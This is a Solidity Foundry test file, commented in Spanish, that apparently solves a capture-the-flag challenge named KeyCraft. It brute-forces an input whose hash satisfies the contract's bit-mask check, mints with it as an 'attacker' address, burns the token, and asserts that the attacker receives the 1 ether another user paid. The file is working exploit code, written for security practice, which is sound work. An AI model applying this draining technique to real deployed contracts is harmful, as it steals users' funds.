// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/KeyCraft.sol";

contract KC is Test {
    KeyCraft k;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        user = makeAddr("user");

        // Obtenemos un número de b válido y su address correspondiente
        bytes memory b = abi.encodePacked(findNumber());
        attacker = address(uint160(uint256(keccak256(b))));

        vm.deal(user, 1 ether);

        vm.startPrank(owner);
        k = new KeyCraft("KeyCraft", "KC");
        vm.stopPrank();

        vm.startPrank(user);
        k.mint{value: 1 ether}(hex"dead");
        vm.stopPrank();
    }

    function testKeyCraft() public {
        vm.startPrank(attacker);

        //Solution
        // Obtenemos un número de b válido, minteamos un NFT y lo quemamos
        bytes memory b = abi.encodePacked(findNumber());
        k.mint(bytes(b));
        k.burn(2);

        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
    }

    /*
    * Busca un valor de b que cumpla las condiciones
    */
    function findNumber() public returns(uint256) {
        uint256 b = 0;
        while(true) {
            uint a = uint160(uint256(keccak256(abi.encodePacked(b))));

            a = a >> 108;
            a = a << 240;
            a = a >> 240;

            if (a == 13057) {
                return b;
            }

            b++;
        }
    }
}